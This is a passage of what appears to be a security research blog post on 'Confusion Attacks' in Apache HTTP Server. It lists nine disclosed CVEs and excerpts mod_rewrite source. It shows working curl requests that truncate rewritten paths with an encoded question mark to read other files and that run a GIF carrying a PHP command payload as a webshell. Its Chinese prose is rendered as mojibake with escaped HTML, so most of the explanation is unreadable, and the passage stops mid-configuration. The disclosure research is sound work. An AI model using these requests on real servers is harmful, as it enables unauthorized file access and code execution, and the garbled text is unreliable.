&lt;p&gt;åŸºæ–¼å‰é¢çš„æ€è€ƒï¼Œæˆ‘å€‘é–‹å§‹å°ˆæ³¨åœ¨&lt;strong&gt;ç ”ç©¶é€™äº›æ¨¡çµ„é–“çš„ã€Œé—œä¿‚ã€ä»¥åŠã€Œäº¤äº’ä½œç”¨ã€&lt;/strong&gt;ã€‚ å¦‚æœæœ‰ä¸€å€‹æ¨¡çµ„ä¸å°å¿ƒä¿®æ”¹åˆ°äº†å®ƒè¦ºå¾—ä¸é‡è¦ä½†å°å¦ä¸€å€‹æ¨¡çµ„è‡³é—œé‡è¦çš„çµæ§‹æ¬„ä½ï¼Œé‚£å¯èƒ½å°±æœƒå½±éŸ¿è©²æ¨¡çµ„çš„åˆ¤æ–·ã€‚ ç”šè‡³æ›´é€²ä¸€æ­¥ï¼Œå¦‚æœ Apache HTTP Server å°é€™äº›çµæ§‹çš„å®šç¾©ä¸å¤ ç²¾ç¢ºï¼Œå°è‡´ä¸åŒæ¨¡çµ„å°åŒä¸€å€‹æ¬„ä½åœ¨ç†è§£ä¸Šæœ‰è‘—æ ¹æœ¬çš„ä¸ä¸€è‡´ï¼Œé€™éƒ½å¯èƒ½ç”¢ç”Ÿå®‰å…¨ä¸Šçš„é¢¨éšªï¼&lt;/p&gt;

&lt;p&gt;å¾é€™å€‹å‡ºç™¼é»æˆ‘å€‘ç™¼å±•å‡ºäº†ä¸‰ç¨®ä¸åŒçš„æ”»æ“Šï¼Œç”±æ–¼é€™äº›æ”»æ“Šæˆ–å¤šæˆ–å°‘éƒ½æ¨¡çµ„å°æ–¼çµæ§‹æ¬„ä½çš„èª¤ç”¨æœ‰é—œï¼Œå› æ­¤æŠŠé€™å€‹æ”»æ“Šé¢å‘½åç‚ºã€ŒConfusion Attackã€ï¼Œè€Œä»¥ä¸‹æ˜¯æˆ‘å€‘æ‰€ç™¼å±•å‡ºçš„æ”»æ“Šï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filename Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DocumentRoot Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Handler Confusion&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¾é€™äº›æ”»æ“Šå‡ºç™¼æˆ‘å€‘æ‰¾åˆ°äº† 9 å€‹ä¸åŒçš„æ¼æ´ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38472&lt;/strong&gt; - Apache HTTP Server on Windows UNC SSRF&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-39573&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38477&lt;/strong&gt; - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38476&lt;/strong&gt; - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38475&lt;/strong&gt; - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38474&lt;/strong&gt; - Apache HTTP Server weakness with encoded question marks in backreferences&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38473&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2023-38709&lt;/strong&gt; - Apache HTTP Server: HTTP response splitting&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-??????&lt;/strong&gt; - [redacted]&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é€™äº›æ¼æ´éƒ½é€éå®˜æ–¹çš„å®‰å…¨ä¿¡ç®±å›å ±ï¼Œä¸¦ç”± Apache HTTP Server åœ˜éšŠåœ¨ 2024-07-01 ç™¼ä½ˆå®‰å…¨æ€§é€šå ±ä»¥åŠ 2.4.60 æ›´æ–° (è©³ç´°å¯åƒè€ƒ&lt;a href=&quot;https://httpd.apache.org/security/vulnerabilities_24.html&quot;&gt;å®˜æ–¹å…¬å‘Š&lt;/a&gt;)ã€‚&lt;/p&gt;

&lt;p&gt;ç”±æ–¼é€™æ˜¯ä¸€å€‹é‡å° Httpd æ¶æ§‹ä»¥åŠå…¶å…§éƒ¨æ©Ÿåˆ¶æ‰€å¸¶ä¾†çš„æ–°æ”»æ“Šé¢ï¼Œ&lt;del&gt;ç†æ‰€ç•¶ç„¶ç¬¬ä¸€å€‹åƒèˆ‡çš„äººå¯ä»¥æ‰¾åˆ°æœ€å¤šæ¼æ´ï¼Œå› æ­¤æˆ‘ä¹Ÿæ˜¯ç›®å‰æ“æœ‰æœ€å¤š Apache HTTP Server CVE çš„äºº ğŸ˜‰&lt;/del&gt;ï¼Œå°è‡´å¾ˆå¤šæ›´æ–°ä¿®å¾©ç”±æ–¼å…¶æ­·å²æ¶æ§‹ç„¡æ³•å‘ä¸‹å…¼å®¹ã€‚ æ‰€ä»¥å°æ–¼å¾ˆå¤šé‹è¡Œè¨±ä¹…çš„æ­£å¼ä¼ºæœå™¨ä¾†èªªä¿®å¾©ä¸¦ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œè‹¥ç¶²ç«™ç®¡ç†å“¡ä¸ç¶“æ€è€ƒå°±ç›´æ¥æ›´æ–°åè€Œæœƒæ‰“ç ´è¨±å¤šèˆŠæœ‰çš„è¨­å®šé€ æˆæœå‹™ä¸­æ–·ã€‚ ğŸ˜¨&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†å°±é–‹å§‹ä»‹ç´¹é€™æ¬¡ç™¼å±•å‡ºä¾†çš„æ”»æ“Šå€‘å§ï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-1-filename-confusion&quot;&gt;ğŸ”¥ 1. Filename Confusion&lt;/h3&gt;

&lt;p&gt;é¦–å…ˆï¼Œç¬¬ä¸€å€‹æ˜¯åŸºæ–¼ Filename æ¬„ä½ä¸Šçš„ Confusionï¼Œå¾å­—é¢ä¸Šä¾†çœ‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; æ‡‰è©²æ˜¯ä¸€å€‹æª”æ¡ˆç³»çµ±è·¯å¾‘ï¼Œç„¶è€Œåœ¨ Httpd ä¸­ï¼Œæœ‰äº›æ¨¡çµ„æœƒæŠŠå®ƒç•¶æˆç¶²å€ä¾†è™•ç†ã€‚ å¦‚æœåœ¨ HTTP è«‹æ±‚çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ‰äº›æ¨¡çµ„æŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ç•¶æˆæª”æ¡ˆè·¯å¾‘ï¼Œè€Œå…¶ä»–æ¨¡çµ„å°‡å®ƒç•¶æˆç¶²å€ï¼Œé€™å…¶ä¸­çš„ä¸ä¸€è‡´å°±æœƒé€ æˆå®‰å…¨ä¸Šçš„å•é¡Œï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-1-1-truncation&quot;&gt;âš”ï¸ Primitive 1-1. Truncation&lt;/h4&gt;

&lt;p&gt;æ‰€ä»¥å“ªäº›æ¨¡çµ„æœƒæŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ç•¶æˆç¶²å€å‘¢ï¼Ÿ é¦–å…ˆæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; å…è¨±ç¶²ç«™ç®¡ç†å“¡é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; èªæ³•è¼•é¬†çš„å°‡è·¯å¾‘é€éæŒ‡å®šçš„è¦å‰‡æ”¹å¯«ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; Pattern Substitution [flags]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­ç›®æ¨™å¯ä»¥æ˜¯ä¸€å€‹æª”æ¡ˆç³»çµ±è·¯å¾‘æˆ–æ˜¯ä¸€å€‹ç¶²å€ï¼Œæˆ‘æƒ³é€™æ‡‰è©²æ˜¯ä¸€å€‹ç‚ºäº†ä½¿ç”¨è€…é«”é©—æ‰€åšå‡ºçš„æ–¹ä¾¿ï¼Œä½†åŒæ™‚é€™å€‹ã€Œæ–¹ä¾¿ã€ä¹Ÿå¸¶å‡ºäº†ä¸€äº›é¢¨éšªï¼Œä¾‹å¦‚&lt;strong&gt;åœ¨æ”¹å¯«è·¯å¾‘æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; æœƒå¼·åˆ¶æŠŠçµæœè¦–ç‚ºç¶²å€è™•ç† (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splitout_queryargs()&lt;/code&gt;)&lt;/strong&gt;ï¼Œé€™å°è‡´äº†åœ¨ HTTP è«‹æ±‚ä¸­å¯ä»¥é€éä¸€å€‹å•è™Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%3F&lt;/code&gt; å»æˆªæ–· &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; å¾Œé¢çš„è·¯å¾‘æˆ–ç¶²å€ï¼Œä¸¦å¼•å‡ºä»¥ä¸‹å…©ç¨®æ”»æ“Šæ‰‹æ³•ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141&quot;&gt;modules/mappers/mod_rewrite.c#L4141&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * Apply a single RewriteRule
 */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_rewrite_rule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriterule_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewrite_ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_regmatch_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regmatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AP_MAX_REG_MATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;apr_array_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nelts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apply_rewrite_cond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// [...] do the remaining stuff&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;cm&quot;&gt;/* Now adjust API&apos;s knowledge about r-&amp;gt;filename and r-&amp;gt;args */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newuri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULEFLAG_DISCARDPATHINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;splitout_queryargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------- [!!!] Truncate the `r-&amp;gt;filename`&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-1-1-1-path-truncation&quot;&gt;âœ”ï¸ 1-1-1. Path Truncation&lt;/h5&gt;

&lt;p&gt;é¦–å…ˆï¼Œç¬¬ä¸€å€‹æ”»æ“Šæ‰‹æ³•æ˜¯æª”æ¡ˆç³»çµ±è·¯å¾‘ä¸Šçš„æˆªæ–·ï¼Œæƒ³åƒä¸‹é¢é€™å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;^/user/(.+)$&quot; &quot;/var/user/$1/profile.yml&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¼ºæœå™¨æœƒæ ¹æ“šç¶²å€è·¯å¾‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/&lt;/code&gt; å¾Œçš„ä½¿ç”¨è€…åç¨±é–‹å•Ÿç›¸å°æ‡‰çš„å€‹äººè¨­å®šæª”æ¡ˆï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/profile.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; æœƒå¼·åˆ¶å°‡é‡å¯«å¾Œçš„çµæœç•¶æˆä¸€å€‹ç¶²å€è™•ç†ï¼Œå› æ­¤é›–ç„¶ç›®æ¨™æ˜¯ä¸€å€‹æª”æ¡ˆç³»çµ±è·¯å¾‘ï¼Œä½†å»å¯ä»¥é€éä¸€å€‹å•è™Ÿå»æˆªæ–·å¾Œæ–¹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile.yml&lt;/code&gt; ä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange%2Fsecret.yml%3F
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/secret.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™æ˜¯æˆ‘å€‘çš„ç¬¬ä¸€å€‹æ”»æ“Šæ‰‹æ³• â€”â€” è·¯å¾‘æˆªæ–·ã€‚ å°æ–¼é€™å€‹æ”»æ“Šæ‰‹æ³•çš„æ¢ç´¢å…ˆç¨ç¨åœç•™åœ¨é€™é‚Šï¼Œé›–ç„¶ç›®å‰çœ‹èµ·ä¾†é‚„åªæ˜¯ä¸€å€‹å°ç‘•ç–µï¼Œä½†è«‹å…ˆè¨˜å¥½å®ƒï¼Œå› ç‚ºé€™æœƒåœ¨ä¹‹å¾Œçš„æ”»æ“Šä¸­ä¸€å†çš„å‡ºç¾ï¼Œæ…¢æ…¢æŠŠé€™å€‹çœ‹ä¼¼ç„¡ç”¨çš„å°ç ´å£æ’•è£‚é–‹ä¾†ï¼ ğŸ˜œ&lt;/p&gt;

&lt;h5 id=&quot;ï¸-1-1-2-mislead-rewriteflag-assignment&quot;&gt;âœ”ï¸ 1-1-2. Mislead RewriteFlag Assignment&lt;/h5&gt;

&lt;p&gt;æˆªæ–·æ‰‹æ³•çš„ç¬¬äºŒå€‹åˆ©ç”¨æ˜¯èª¤å° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlag&lt;/code&gt; çš„è¨­ç½®ï¼Œæƒ³åƒç¶²ç«™ç®¡ç†å“¡é€éä¸‹åˆ—çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; å»ç®¡ç†ç¶²ç«™ä¸­è·¯å¾‘ä»¥åŠç›¸å°æ‡‰æ¨¡çµ„ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^(.+\.php)$  $1  [H=application/x-httpd-php]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœè«‹æ±‚é™„æª”åæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; çµå°¾å‰‡åŠ ä¸Š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; ç›¸å°æ‡‰çš„è™•ç†å™¨ (æ­¤å¤–ä¹Ÿå¯ä»¥æ˜¯ç’°å¢ƒè®Šæ•¸æˆ–æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;ï¼Œé—œæ–¼æ¨™èªŒçš„è©³ç´°è¨­å®šå¯åƒè€ƒå®˜æ–¹çš„æ‰‹å†Š &lt;a href=&quot;https://httpd.apache.org/docs/2.4/rewrite/flags.html&quot;&gt;RewriteRule Flags&lt;/a&gt;)ã€‚&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; çš„æˆªæ–·è¡Œç‚ºç™¼ç”Ÿåœ¨æ­£è¦è¡¨é”å¼åŒ¹é…å¾Œï¼Œå› æ­¤æƒ¡æ„çš„æ”»æ“Šè€…å¯ä»¥åˆ©ç”¨åŸæœ¬çš„è¦å‰‡ï¼Œé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlag&lt;/code&gt; è¨­å®šåˆ°ä¸å±¬æ–¼å®ƒå€‘çš„è«‹æ±‚ä¸Šã€‚ ä¾‹å¦‚ä¸Šå‚³ä¸€å€‹å¤¾å¸¶æƒ¡æ„ PHP ç¨‹å¼ç¢¼çš„ GIF åœ–ç‰‡ä¸¦é€éæƒ¡æ„è«‹æ±‚å°‡åœ–ç‰‡ç•¶æˆå¾Œé–€åŸ·è¡Œï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif
 &lt;span class=&quot;c&quot;&gt;# GIF89a &amp;lt;?=`id`;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif%3fooo.php
 &lt;span class=&quot;c&quot;&gt;# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-1-2-acl-bypass&quot;&gt;âš”ï¸ Primitive 1-2. ACL Bypass&lt;/h4&gt;

&lt;p&gt;Filename Confusion çš„ç¬¬äºŒå€‹æ”»æ“Šæ‰‹æ³•ç™¼ç”Ÿåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; èº«ä¸Šï¼Œç›¸è¼ƒå‰ä¸€å€‹æ”»æ“Šæ˜¯ç„¡æ¢ä»¶å°‡ç›®æ¨™ç•¶æˆç¶²å€è™•ç†ï¼Œé€™æ¬¡å‰‡æ˜¯&lt;strong&gt;å› ç‚ºæ¨¡çµ„é–“å° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; çš„ç†è§£ä¸ä¸€è‡´æ‰€å°è‡´çš„èªè­‰åŠå­˜å–æ§åˆ¶ç¹é&lt;/strong&gt;ï¼&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ç•¶æˆç¶²å€é€™ä»¶äº‹æƒ…å…¶å¯¦å¾ˆåˆç†ï¼Œå› ç‚ºåŸæœ¬ Proxy çš„ç›®çš„å°±æ˜¯å°‡è«‹æ±‚ã€Œå°å‘ã€åˆ°å…¶å®ƒç¶²å€ä¸Šï¼Œä½†å®‰å…¨å¾€å¾€å°±æ˜¯å–®ç¨æ‹¿å‡ºä¾†çœ‹æ²’å•é¡Œï¼Œæ­é…åœ¨ä¸€èµ·å°±å‡ºå•é¡Œäº†ï¼ ç‰¹åˆ¥æ˜¯ç•¶å¤§å¤šæ•¸æ¨¡çµ„é è¨­å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; è¦–ç‚ºæª”æ¡ˆç³»çµ±è·¯å¾‘æ™‚ï¼Œè©¦æƒ³ä¸€ä¸‹å‡è¨­ä»Šå¤©ä½ ä½¿ç”¨åŸºæ–¼æª”æ¡ˆç³»çµ±çš„å­˜å–æ§åˆ¶æ¨¡çµ„ï¼Œè€Œç¾åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; åˆæœƒæŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ç•¶æˆç¶²å€ï¼Œé€™å…¶ä¸­çš„ä¸ä¸€è‡´å°±å¯ä»¥å°è‡´å­˜å–æ§åˆ¶æˆ–æ˜¯èªè­‰è¢«ç¹éï¼&lt;/p&gt;

&lt;p&gt;ä¸€å€‹ç¶“å…¸çš„ä¾‹å­æ˜¯ï¼Œç¶²ç«™ç®¡ç†å“¡é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; èªæ³•å»å°å–®ä¸€æª”æ¡ˆåŠ ä¸Šé™åˆ¶ï¼Œä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AuthType&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Basic&lt;/span&gt; 
    &lt;span class=&quot;ss&quot;&gt;AuthName&lt;/span&gt; &quot;Admin Panel&quot;
